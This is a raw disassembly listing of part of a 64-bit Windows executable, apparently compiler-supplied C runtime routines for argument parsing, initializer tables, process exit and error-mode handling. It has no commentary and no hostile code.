   140003a31:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   140003a35:	ba 08 00 00 00       	mov    $0x8,%edx
   140003a3a:	e8 f9 0d 00 00       	call   0x140004838
   140003a3f:	48 8b d8             	mov    %rax,%rbx
   140003a42:	48 85 c0             	test   %rax,%rax
   140003a45:	74 6c                	je     0x140003ab3
   140003a47:	4c 8b f8             	mov    %rax,%r15
   140003a4a:	41 38 36             	cmp    %sil,(%r14)
   140003a4d:	74 61                	je     0x140003ab0
   140003a4f:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140003a53:	48 ff c5             	inc    %rbp
   140003a56:	41 38 34 2e          	cmp    %sil,(%r14,%rbp,1)
   140003a5a:	75 f7                	jne    0x140003a53
   140003a5c:	48 ff c5             	inc    %rbp
   140003a5f:	41 80 3e 3d          	cmpb   $0x3d,(%r14)
   140003a63:	74 35                	je     0x140003a9a
   140003a65:	ba 01 00 00 00       	mov    $0x1,%edx
   140003a6a:	48 8b cd             	mov    %rbp,%rcx
   140003a6d:	e8 c6 0d 00 00       	call   0x140004838
   140003a72:	48 8b f8             	mov    %rax,%rdi
   140003a75:	48 85 c0             	test   %rax,%rax
   140003a78:	74 25                	je     0x140003a9f
   140003a7a:	4d 8b c6             	mov    %r14,%r8
   140003a7d:	48 8b d5             	mov    %rbp,%rdx
   140003a80:	48 8b c8             	mov    %rax,%rcx
   140003a83:	e8 58 0c 00 00       	call   0x1400046e0
   140003a88:	33 c9                	xor    %ecx,%ecx
   140003a8a:	85 c0                	test   %eax,%eax
   140003a8c:	75 48                	jne    0x140003ad6
   140003a8e:	49 89 3f             	mov    %rdi,(%r15)
   140003a91:	49 83 c7 08          	add    $0x8,%r15
   140003a95:	e8 a6 0c 00 00       	call   0x140004740
   140003a9a:	4c 03 f5             	add    %rbp,%r14
   140003a9d:	eb ab                	jmp    0x140003a4a
   140003a9f:	48 8b cb             	mov    %rbx,%rcx
   140003aa2:	e8 45 00 00 00       	call   0x140003aec
   140003aa7:	33 c9                	xor    %ecx,%ecx
   140003aa9:	e8 92 0c 00 00       	call   0x140004740
   140003aae:	eb 03                	jmp    0x140003ab3
   140003ab0:	48 8b f3             	mov    %rbx,%rsi
   140003ab3:	33 c9                	xor    %ecx,%ecx
   140003ab5:	e8 86 0c 00 00       	call   0x140004740
   140003aba:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003abf:	48 8b c6             	mov    %rsi,%rax
   140003ac2:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140003ac7:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140003acc:	48 83 c4 30          	add    $0x30,%rsp
   140003ad0:	41 5f                	pop    %r15
   140003ad2:	41 5e                	pop    %r14
   140003ad4:	5f                   	pop    %rdi
   140003ad5:	c3                   	ret
   140003ad6:	45 33 c9             	xor    %r9d,%r9d
   140003ad9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003ade:	45 33 c0             	xor    %r8d,%r8d
   140003ae1:	33 d2                	xor    %edx,%edx
   140003ae3:	e8 08 11 00 00       	call   0x140004bf0
   140003ae8:	cc                   	int3
   140003ae9:	90                   	nop
   140003aea:	90                   	nop
   140003aeb:	90                   	nop
   140003aec:	48 85 c9             	test   %rcx,%rcx
   140003aef:	74 3b                	je     0x140003b2c
   140003af1:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003af6:	57                   	push   %rdi
   140003af7:	48 83 ec 20          	sub    $0x20,%rsp
   140003afb:	48 8b 01             	mov    (%rcx),%rax
   140003afe:	48 8b d9             	mov    %rcx,%rbx
   140003b01:	48 8b f9             	mov    %rcx,%rdi
   140003b04:	eb 0f                	jmp    0x140003b15
   140003b06:	48 8b c8             	mov    %rax,%rcx
   140003b09:	e8 32 0c 00 00       	call   0x140004740
   140003b0e:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140003b12:	48 8b 07             	mov    (%rdi),%rax
   140003b15:	48 85 c0             	test   %rax,%rax
   140003b18:	75 ec                	jne    0x140003b06
   140003b1a:	48 8b cb             	mov    %rbx,%rcx
   140003b1d:	e8 1e 0c 00 00       	call   0x140004740
   140003b22:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003b27:	48 83 c4 20          	add    $0x20,%rsp
   140003b2b:	5f                   	pop    %rdi
   140003b2c:	c3                   	ret
   140003b2d:	90                   	nop
   140003b2e:	90                   	nop
   140003b2f:	90                   	nop
   140003b30:	48 83 ec 28          	sub    $0x28,%rsp
   140003b34:	48 8b 09             	mov    (%rcx),%rcx
   140003b37:	48 3b 0d 52 26 01 00 	cmp    0x12652(%rip),%rcx        # 0x140016190
   140003b3e:	74 05                	je     0x140003b45
   140003b40:	e8 a7 ff ff ff       	call   0x140003aec
   140003b45:	48 83 c4 28          	add    $0x28,%rsp
   140003b49:	c3                   	ret
   140003b4a:	90                   	nop
   140003b4b:	90                   	nop
   140003b4c:	48 83 ec 28          	sub    $0x28,%rsp
   140003b50:	48 8b 09             	mov    (%rcx),%rcx
   140003b53:	48 3b 0d 2e 26 01 00 	cmp    0x1262e(%rip),%rcx        # 0x140016188
   140003b5a:	74 05                	je     0x140003b61
   140003b5c:	e8 8b ff ff ff       	call   0x140003aec
   140003b61:	48 83 c4 28          	add    $0x28,%rsp
   140003b65:	c3                   	ret
   140003b66:	90                   	nop
   140003b67:	90                   	nop
   140003b68:	48 83 ec 28          	sub    $0x28,%rsp
   140003b6c:	48 8d 0d 05 26 01 00 	lea    0x12605(%rip),%rcx        # 0x140016178
   140003b73:	e8 b8 ff ff ff       	call   0x140003b30
   140003b78:	48 8d 0d 01 26 01 00 	lea    0x12601(%rip),%rcx        # 0x140016180
   140003b7f:	e8 c8 ff ff ff       	call   0x140003b4c
   140003b84:	48 8b 0d 05 26 01 00 	mov    0x12605(%rip),%rcx        # 0x140016190
   140003b8b:	e8 5c ff ff ff       	call   0x140003aec
   140003b90:	48 8b 0d f1 25 01 00 	mov    0x125f1(%rip),%rcx        # 0x140016188
   140003b97:	48 83 c4 28          	add    $0x28,%rsp
   140003b9b:	e9 4c ff ff ff       	jmp    0x140003aec
   140003ba0:	e9 db fd ff ff       	jmp    0x140003980
   140003ba5:	90                   	nop
   140003ba6:	90                   	nop
   140003ba7:	90                   	nop
   140003ba8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003bad:	57                   	push   %rdi
   140003bae:	48 83 ec 20          	sub    $0x20,%rsp
   140003bb2:	e8 35 23 00 00       	call   0x140005eec
   140003bb7:	48 8b 05 72 26 01 00 	mov    0x12672(%rip),%rax        # 0x140016230
   140003bbe:	48 8d 1d d3 25 01 00 	lea    0x125d3(%rip),%rbx        # 0x140016198
   140003bc5:	48 85 c0             	test   %rax,%rax
   140003bc8:	48 0f 45 d8          	cmovne %rax,%rbx
   140003bcc:	40 32 ff             	xor    %dil,%dil
   140003bcf:	8a 03                	mov    (%rbx),%al
   140003bd1:	3c 20                	cmp    $0x20,%al
   140003bd3:	7f 09                	jg     0x140003bde
   140003bd5:	84 c0                	test   %al,%al
   140003bd7:	74 31                	je     0x140003c0a
   140003bd9:	40 84 ff             	test   %dil,%dil
   140003bdc:	74 26                	je     0x140003c04
   140003bde:	3c 22                	cmp    $0x22,%al
   140003be0:	75 07                	jne    0x140003be9
   140003be2:	40 84 ff             	test   %dil,%dil
   140003be5:	40 0f 94 c7          	sete   %dil
   140003be9:	0f be c8             	movsbl %al,%ecx
   140003bec:	e8 03 27 00 00       	call   0x1400062f4
   140003bf1:	85 c0                	test   %eax,%eax
   140003bf3:	74 03                	je     0x140003bf8
   140003bf5:	48 ff c3             	inc    %rbx
   140003bf8:	48 ff c3             	inc    %rbx
   140003bfb:	eb d2                	jmp    0x140003bcf
   140003bfd:	3c 20                	cmp    $0x20,%al
   140003bff:	7f 09                	jg     0x140003c0a
   140003c01:	48 ff c3             	inc    %rbx
   140003c04:	8a 03                	mov    (%rbx),%al
   140003c06:	84 c0                	test   %al,%al
   140003c08:	75 f3                	jne    0x140003bfd
   140003c0a:	48 8b c3             	mov    %rbx,%rax
   140003c0d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003c12:	48 83 c4 20          	add    $0x20,%rsp
   140003c16:	5f                   	pop    %rdi
   140003c17:	c3                   	ret
   140003c18:	48 8b c4             	mov    %rsp,%rax
   140003c1b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003c1f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140003c23:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003c27:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003c2b:	41 56                	push   %r14
   140003c2d:	48 83 ec 20          	sub    $0x20,%rsp
   140003c31:	45 33 f6             	xor    %r14d,%r14d
   140003c34:	48 8b fa             	mov    %rdx,%rdi
   140003c37:	48 2b f9             	sub    %rcx,%rdi
   140003c3a:	48 8b d9             	mov    %rcx,%rbx
   140003c3d:	48 83 c7 07          	add    $0x7,%rdi
   140003c41:	41 8b ee             	mov    %r14d,%ebp
   140003c44:	48 c1 ef 03          	shr    $0x3,%rdi
   140003c48:	48 3b ca             	cmp    %rdx,%rcx
   140003c4b:	49 0f 47 fe          	cmova  %r14,%rdi
   140003c4f:	48 85 ff             	test   %rdi,%rdi
   140003c52:	74 1f                	je     0x140003c73
   140003c54:	48 8b 33             	mov    (%rbx),%rsi
   140003c57:	48 85 f6             	test   %rsi,%rsi
   140003c5a:	74 0b                	je     0x140003c67
   140003c5c:	48 8b ce             	mov    %rsi,%rcx
   140003c5f:	ff 15 23 86 00 00    	call   *0x8623(%rip)        # 0x14000c288
   140003c65:	ff d6                	call   *%rsi
   140003c67:	48 83 c3 08          	add    $0x8,%rbx
   140003c6b:	48 ff c5             	inc    %rbp
   140003c6e:	48 3b ef             	cmp    %rdi,%rbp
   140003c71:	75 e1                	jne    0x140003c54
   140003c73:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003c78:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003c7d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003c82:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140003c87:	48 83 c4 20          	add    $0x20,%rsp
   140003c8b:	41 5e                	pop    %r14
   140003c8d:	c3                   	ret
   140003c8e:	90                   	nop
   140003c8f:	90                   	nop
   140003c90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c95:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003c9a:	57                   	push   %rdi
   140003c9b:	48 83 ec 20          	sub    $0x20,%rsp
   140003c9f:	48 8b f2             	mov    %rdx,%rsi
   140003ca2:	48 8b d9             	mov    %rcx,%rbx
   140003ca5:	48 3b ca             	cmp    %rdx,%rcx
   140003ca8:	74 20                	je     0x140003cca
   140003caa:	48 8b 3b             	mov    (%rbx),%rdi
   140003cad:	48 85 ff             	test   %rdi,%rdi
   140003cb0:	74 0f                	je     0x140003cc1
   140003cb2:	48 8b cf             	mov    %rdi,%rcx
   140003cb5:	ff 15 cd 85 00 00    	call   *0x85cd(%rip)        # 0x14000c288
   140003cbb:	ff d7                	call   *%rdi
   140003cbd:	85 c0                	test   %eax,%eax
   140003cbf:	75 0b                	jne    0x140003ccc
   140003cc1:	48 83 c3 08          	add    $0x8,%rbx
   140003cc5:	48 3b de             	cmp    %rsi,%rbx
   140003cc8:	eb de                	jmp    0x140003ca8
   140003cca:	33 c0                	xor    %eax,%eax
   140003ccc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003cd1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003cd6:	48 83 c4 20          	add    $0x20,%rsp
   140003cda:	5f                   	pop    %rdi
   140003cdb:	c3                   	ret
   140003cdc:	33 c0                	xor    %eax,%eax
   140003cde:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   140003ce4:	0f 94 c0             	sete   %al
   140003ce7:	c3                   	ret
   140003ce8:	48 8b c4             	mov    %rsp,%rax
   140003ceb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003cef:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140003cf3:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140003cf7:	4c 89 70 20          	mov    %r14,0x20(%rax)
   140003cfb:	41 57                	push   %r15
   140003cfd:	48 83 ec 20          	sub    $0x20,%rsp
   140003d01:	41 8b f0             	mov    %r8d,%esi
   140003d04:	8b da                	mov    %edx,%ebx
   140003d06:	44 8b f1             	mov    %ecx,%r14d
   140003d09:	45 85 c0             	test   %r8d,%r8d
   140003d0c:	75 4a                	jne    0x140003d58
   140003d0e:	33 c9                	xor    %ecx,%ecx
   140003d10:	ff 15 ca 83 00 00    	call   *0x83ca(%rip)        # 0x14000c0e0
   140003d16:	48 85 c0             	test   %rax,%rax
   140003d19:	74 3d                	je     0x140003d58
   140003d1b:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140003d20:	66 39 08             	cmp    %cx,(%rax)
   140003d23:	75 33                	jne    0x140003d58
   140003d25:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140003d29:	48 03 c8             	add    %rax,%rcx
   140003d2c:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140003d32:	75 24                	jne    0x140003d58
   140003d34:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140003d39:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140003d3d:	75 19                	jne    0x140003d58
   140003d3f:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140003d46:	76 10                	jbe    0x140003d58
   140003d48:	39 b1 f8 00 00 00    	cmp    %esi,0xf8(%rcx)
   140003d4e:	74 08                	je     0x140003d58
   140003d50:	41 8b ce             	mov    %r14d,%ecx
   140003d53:	e8 48 01 00 00       	call   0x140003ea0
   140003d58:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003d5d:	e8 1a 27 00 00       	call   0x14000647c
   140003d62:	90                   	nop
   140003d63:	80 3d 3e 24 01 00 00 	cmpb   $0x0,0x1243e(%rip)        # 0x1400161a8
   140003d6a:	0f 85 b2 00 00 00    	jne    0x140003e22
   140003d70:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140003d76:	41 8b c7             	mov    %r15d,%eax
   140003d79:	87 05 1d 24 01 00    	xchg   %eax,0x1241d(%rip)        # 0x14001619c
   140003d7f:	85 db                	test   %ebx,%ebx
   140003d81:	75 48                	jne    0x140003dcb
   140003d83:	48 8b 3d 8e 12 01 00 	mov    0x1128e(%rip),%rdi        # 0x140015018
   140003d8a:	8b d7                	mov    %edi,%edx
   140003d8c:	83 e2 3f             	and    $0x3f,%edx
   140003d8f:	8d 4b 40             	lea    0x40(%rbx),%ecx
   140003d92:	2b ca                	sub    %edx,%ecx
   140003d94:	33 c0                	xor    %eax,%eax
   140003d96:	48 d3 c8             	ror    %cl,%rax
   140003d99:	48 33 c7             	xor    %rdi,%rax
   140003d9c:	48 8b 0d fd 23 01 00 	mov    0x123fd(%rip),%rcx        # 0x1400161a0
   140003da3:	48 3b c8             	cmp    %rax,%rcx
   140003da6:	74 1a                	je     0x140003dc2
   140003da8:	48 33 f9             	xor    %rcx,%rdi
   140003dab:	8b ca                	mov    %edx,%ecx
   140003dad:	48 d3 cf             	ror    %cl,%rdi
   140003db0:	48 8b cf             	mov    %rdi,%rcx
   140003db3:	ff 15 cf 84 00 00    	call   *0x84cf(%rip)        # 0x14000c288
   140003db9:	45 33 c0             	xor    %r8d,%r8d
   140003dbc:	33 d2                	xor    %edx,%edx
   140003dbe:	33 c9                	xor    %ecx,%ecx
   140003dc0:	ff d7                	call   *%rdi
   140003dc2:	48 8d 0d ef 23 01 00 	lea    0x123ef(%rip),%rcx        # 0x1400161b8
   140003dc9:	eb 0c                	jmp    0x140003dd7
   140003dcb:	41 3b df             	cmp    %r15d,%ebx
   140003dce:	75 0d                	jne    0x140003ddd
   140003dd0:	48 8d 0d f9 23 01 00 	lea    0x123f9(%rip),%rcx        # 0x1400161d0
   140003dd7:	e8 b8 06 00 00       	call   0x140004494
   140003ddc:	90                   	nop
   140003ddd:	85 db                	test   %ebx,%ebx
   140003ddf:	75 13                	jne    0x140003df4
   140003de1:	48 8d 15 28 85 00 00 	lea    0x8528(%rip),%rdx        # 0x14000c310
   140003de8:	48 8d 0d 01 85 00 00 	lea    0x8501(%rip),%rcx        # 0x14000c2f0
   140003def:	e8 24 fe ff ff       	call   0x140003c18
   140003df4:	48 8d 15 25 85 00 00 	lea    0x8525(%rip),%rdx        # 0x14000c320
   140003dfb:	48 8d 0d 16 85 00 00 	lea    0x8516(%rip),%rcx        # 0x14000c318
   140003e02:	e8 11 fe ff ff       	call   0x140003c18
   140003e07:	0f b6 05 9a 23 01 00 	movzbl 0x1239a(%rip),%eax        # 0x1400161a8
   140003e0e:	85 f6                	test   %esi,%esi
   140003e10:	41 0f 44 c7          	cmove  %r15d,%eax
   140003e14:	88 05 8e 23 01 00    	mov    %al,0x1238e(%rip)        # 0x1400161a8
   140003e1a:	eb 06                	jmp    0x140003e22
   140003e1c:	e8 97 08 00 00       	call   0x1400046b8
   140003e21:	90                   	nop
   140003e22:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003e27:	e8 a4 26 00 00       	call   0x1400064d0
   140003e2c:	85 f6                	test   %esi,%esi
   140003e2e:	75 09                	jne    0x140003e39
   140003e30:	41 8b ce             	mov    %r14d,%ecx
   140003e33:	e8 1c 00 00 00       	call   0x140003e54
   140003e38:	cc                   	int3
   140003e39:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e3e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003e43:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140003e48:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   140003e4d:	48 83 c4 20          	add    $0x20,%rsp
   140003e51:	41 5f                	pop    %r15
   140003e53:	c3                   	ret
   140003e54:	53                   	push   %rbx
   140003e55:	48 83 ec 20          	sub    $0x20,%rsp
   140003e59:	8b d9                	mov    %ecx,%ebx
   140003e5b:	e8 a4 2b 00 00       	call   0x140006a04
   140003e60:	84 c0                	test   %al,%al
   140003e62:	74 28                	je     0x140003e8c
   140003e64:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140003e6b:	00 00 
   140003e6d:	8b 90 bc 00 00 00    	mov    0xbc(%rax),%edx
   140003e73:	c1 ea 08             	shr    $0x8,%edx
   140003e76:	f6 c2 01             	test   $0x1,%dl
   140003e79:	75 11                	jne    0x140003e8c
   140003e7b:	ff 15 67 82 00 00    	call   *0x8267(%rip)        # 0x14000c0e8
   140003e81:	48 8b c8             	mov    %rax,%rcx
   140003e84:	8b d3                	mov    %ebx,%edx
   140003e86:	ff 15 64 82 00 00    	call   *0x8264(%rip)        # 0x14000c0f0
   140003e8c:	8b cb                	mov    %ebx,%ecx
   140003e8e:	e8 0d 00 00 00       	call   0x140003ea0
   140003e93:	8b cb                	mov    %ebx,%ecx
   140003e95:	ff 15 ed 82 00 00    	call   *0x82ed(%rip)        # 0x14000c188
   140003e9b:	cc                   	int3
   140003e9c:	90                   	nop
   140003e9d:	90                   	nop
   140003e9e:	90                   	nop
   140003e9f:	90                   	nop
   140003ea0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003ea5:	57                   	push   %rdi
   140003ea6:	48 83 ec 20          	sub    $0x20,%rsp
   140003eaa:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140003eb0:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003eb5:	8b f9                	mov    %ecx,%edi
   140003eb7:	48 8d 15 aa 87 00 00 	lea    0x87aa(%rip),%rdx        # 0x14000c668
   140003ebe:	33 c9                	xor    %ecx,%ecx
   140003ec0:	ff 15 52 81 00 00    	call   *0x8152(%rip)        # 0x14000c018
   140003ec6:	85 c0                	test   %eax,%eax
   140003ec8:	74 27                	je     0x140003ef1
   140003eca:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003ecf:	48 8d 15 aa 87 00 00 	lea    0x87aa(%rip),%rdx        # 0x14000c680
   140003ed6:	ff 15 44 81 00 00    	call   *0x8144(%rip)        # 0x14000c020
   140003edc:	48 8b d8             	mov    %rax,%rbx
   140003edf:	48 85 c0             	test   %rax,%rax
   140003ee2:	74 0d                	je     0x140003ef1
   140003ee4:	48 8b c8             	mov    %rax,%rcx
   140003ee7:	ff 15 9b 83 00 00    	call   *0x839b(%rip)        # 0x14000c288
   140003eed:	8b cf                	mov    %edi,%ecx
   140003eef:	ff d3                	call   *%rbx
   140003ef1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003ef6:	48 85 c9             	test   %rcx,%rcx
   140003ef9:	74 06                	je     0x140003f01
   140003efb:	ff 15 2f 82 00 00    	call   *0x822f(%rip)        # 0x14000c130
   140003f01:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003f06:	48 83 c4 20          	add    $0x20,%rsp
   140003f0a:	5f                   	pop    %rdi
   140003f0b:	c3                   	ret
   140003f0c:	48 89 0d 8d 22 01 00 	mov    %rcx,0x1228d(%rip)        # 0x1400161a0
   140003f13:	c3                   	ret
   140003f14:	ba 02 00 00 00       	mov    $0x2,%edx
   140003f19:	33 c9                	xor    %ecx,%ecx
   140003f1b:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   140003f1f:	e9 c4 fd ff ff       	jmp    0x140003ce8
   140003f24:	33 d2                	xor    %edx,%edx
   140003f26:	33 c9                	xor    %ecx,%ecx
   140003f28:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140003f2c:	e9 b7 fd ff ff       	jmp    0x140003ce8
   140003f31:	90                   	nop
   140003f32:	90                   	nop
   140003f33:	90                   	nop
   140003f34:	45 33 c0             	xor    %r8d,%r8d
   140003f37:	41 8d 50 02          	lea    0x2(%r8),%edx
   140003f3b:	e9 a8 fd ff ff       	jmp    0x140003ce8
   140003f40:	48 83 ec 28          	sub    $0x28,%rsp
   140003f44:	4c 8b 05 cd 10 01 00 	mov    0x110cd(%rip),%r8        # 0x140015018
   140003f4b:	48 8b d1             	mov    %rcx,%rdx
   140003f4e:	41 8b c0             	mov    %r8d,%eax
   140003f51:	b9 40 00 00 00       	mov    $0x40,%ecx
   140003f56:	83 e0 3f             	and    $0x3f,%eax
   140003f59:	2b c8                	sub    %eax,%ecx
   140003f5b:	33 c0                	xor    %eax,%eax
   140003f5d:	48 d3 c8             	ror    %cl,%rax
   140003f60:	49 33 c0             	xor    %r8,%rax
   140003f63:	48 39 05 36 22 01 00 	cmp    %rax,0x12236(%rip)        # 0x1400161a0
   140003f6a:	75 12                	jne    0x140003f7e
   140003f6c:	48 d3 ca             	ror    %cl,%rdx
   140003f6f:	49 33 d0             	xor    %r8,%rdx
   140003f72:	48 89 15 27 22 01 00 	mov    %rdx,0x12227(%rip)        # 0x1400161a0
   140003f79:	48 83 c4 28          	add    $0x28,%rsp
   140003f7d:	c3                   	ret
   140003f7e:	e8 35 07 00 00       	call   0x1400046b8
   140003f83:	cc                   	int3
   140003f84:	45 33 c0             	xor    %r8d,%r8d
   140003f87:	33 d2                	xor    %edx,%edx
   140003f89:	e9 5a fd ff ff       	jmp    0x140003ce8
   140003f8e:	90                   	nop
   140003f8f:	90                   	nop
   140003f90:	48 83 ec 28          	sub    $0x28,%rsp
   140003f94:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   140003f9a:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   140003f9f:	75 12                	jne    0x140003fb3
   140003fa1:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   140003fa7:	74 0a                	je     0x140003fb3
   140003fa9:	87 0d 55 26 01 00    	xchg   %ecx,0x12655(%rip)        # 0x140016604
   140003faf:	33 c0                	xor    %eax,%eax
   140003fb1:	eb 15                	jmp    0x140003fc8
   140003fb3:	e8 38 0d 00 00       	call   0x140004cf0
   140003fb8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140003fbe:	e8 0d 0c 00 00       	call   0x140004bd0
   140003fc3:	b8 16 00 00 00       	mov    $0x16,%eax
   140003fc8:	48 83 c4 28          	add    $0x28,%rsp
   140003fcc:	c3                   	ret
   140003fcd:	90                   	nop
   140003fce:	90                   	nop
   140003fcf:	90                   	nop
   140003fd0:	b8 01 00 00 00       	mov    $0x1,%eax
   140003fd5:	87 05 d1 21 01 00    	xchg   %eax,0x121d1(%rip)        # 0x1400161ac
   140003fdb:	c3                   	ret
   140003fdc:	57                   	push   %rdi
   140003fdd:	48 83 ec 20          	sub    $0x20,%rsp
   140003fe1:	48 8d 3d 08 16 01 00 	lea    0x11608(%rip),%rdi        # 0x1400155f0
   140003fe8:	48 39 3d 29 2a 01 00 	cmp    %rdi,0x12a29(%rip)        # 0x140016a18
   140003fef:	74 2b                	je     0x14000401c
   140003ff1:	b9 04 00 00 00       	mov    $0x4,%ecx
   140003ff6:	e8 81 24 00 00       	call   0x14000647c
   140003ffb:	90                   	nop
   140003ffc:	48 8b d7             	mov    %rdi,%rdx
   140003fff:	48 8d 0d 12 2a 01 00 	lea    0x12a12(%rip),%rcx        # 0x140016a18
   140004006:	e8 b5 38 00 00       	call   0x1400078c0
   14000400b:	48 89 05 06 2a 01 00 	mov    %rax,0x12a06(%rip)        # 0x140016a18
   140004012:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004017:	e8 b4 24 00 00       	call   0x1400064d0
   14000401c:	48 83 c4 20          	add    $0x20,%rsp
   140004020:	5f                   	pop    %rdi
   140004021:	c3                   	ret
   140004022:	90                   	nop
   140004023:	90                   	nop
   140004024:	53                   	push   %rbx
   140004025:	48 83 ec 20          	sub    $0x20,%rsp
   140004029:	8b d9                	mov    %ecx,%ebx
   14000402b:	e8 80 10 00 00       	call   0x1400050b0
   140004030:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140004037:	41 8b d0             	mov    %r8d,%edx
   14000403a:	80 e2 02             	and    $0x2,%dl
   14000403d:	f6 da                	neg    %dl
   14000403f:	1b c9                	sbb    %ecx,%ecx
   140004041:	83 fb ff             	cmp    $0xffffffff,%ebx
   140004044:	74 36                	je     0x14000407c
   140004046:	85 db                	test   %ebx,%ebx
   140004048:	74 39                	je     0x140004083
   14000404a:	83 fb 01             	cmp    $0x1,%ebx
   14000404d:	74 20                	je     0x14000406f
   14000404f:	83 fb 02             	cmp    $0x2,%ebx
   140004052:	74 15                	je     0x140004069
   140004054:	e8 97 0c 00 00       	call   0x140004cf0
   140004059:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000405f:	e8 6c 0b 00 00       	call   0x140004bd0
   140004064:	83 c8 ff             	or     $0xffffffff,%eax
   140004067:	eb 1d                	jmp    0x140004086
   140004069:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   14000406d:	eb 04                	jmp    0x140004073
   14000406f:	41 83 c8 02          	or     $0x2,%r8d
   140004073:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   14000407a:	eb 07                	jmp    0x140004083
   14000407c:	83 0d 7d 17 01 00 ff 	orl    $0xffffffff,0x1177d(%rip)        # 0x140015800
   140004083:	8d 41 02             	lea    0x2(%rcx),%eax
   140004086:	48 83 c4 20          	add    $0x20,%rsp
   14000408a:	5b                   	pop    %rbx
   14000408b:	c3                   	ret
   14000408c:	90                   	nop
   14000408d:	90                   	nop
   14000408e:	90                   	nop
   14000408f:	90                   	nop
   140004090:	8b 05 1a 21 01 00    	mov    0x1211a(%rip),%eax        # 0x1400161b0
   140004096:	c3                   	ret
   140004097:	90                   	nop
   140004098:	48 83 ec 28          	sub    $0x28,%rsp
   14000409c:	83 f9 01             	cmp    $0x1,%ecx
   14000409f:	76 15                	jbe    0x1400040b6
   1400040a1:	e8 4a 0c 00 00       	call   0x140004cf0
   1400040a6:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400040ac:	e8 1f 0b 00 00       	call   0x140004bd0
   1400040b1:	83 c8 ff             	or     $0xffffffff,%eax
   1400040b4:	eb 08                	jmp    0x1400040be
   1400040b6:	87 0d f4 20 01 00    	xchg   %ecx,0x120f4(%rip)        # 0x1400161b0
   1400040bc:	8b c1                	mov    %ecx,%eax
   1400040be:	48 83 c4 28          	add    $0x28,%rsp
   1400040c2:	c3                   	ret
   1400040c3:	90                   	nop
   1400040c4:	48 8d 05 e9 20 01 00 	lea    0x120e9(%rip),%rax        # 0x1400161b4
   1400040cb:	c3                   	ret
   1400040cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400040d1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400040d6:	57                   	push   %rdi
   1400040d7:	48 83 ec 20          	sub    $0x20,%rsp
   1400040db:	49 8b d9             	mov    %r9,%rbx
   1400040de:	49 8b f8             	mov    %r8,%rdi
   1400040e1:	8b 0a                	mov    (%rdx),%ecx
   1400040e3:	e8 94 23 00 00       	call   0x14000647c
   1400040e8:	90                   	nop
   1400040e9:	48 8b cf             	mov    %rdi,%rcx
   1400040ec:	e8 b7 01 00 00       	call   0x1400042a8
   1400040f1:	8b f8                	mov    %eax,%edi
   1400040f3:	8b 0b                	mov    (%rbx),%ecx
   1400040f5:	e8 d6 23 00 00       	call   0x1400064d0
   1400040fa:	8b c7                	mov    %edi,%eax
   1400040fc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004101:	48 83 c4 20          	add    $0x20,%rsp
   140004105:	5f                   	pop    %rdi
   140004106:	c3                   	ret
   140004107:	90                   	nop
   140004108:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
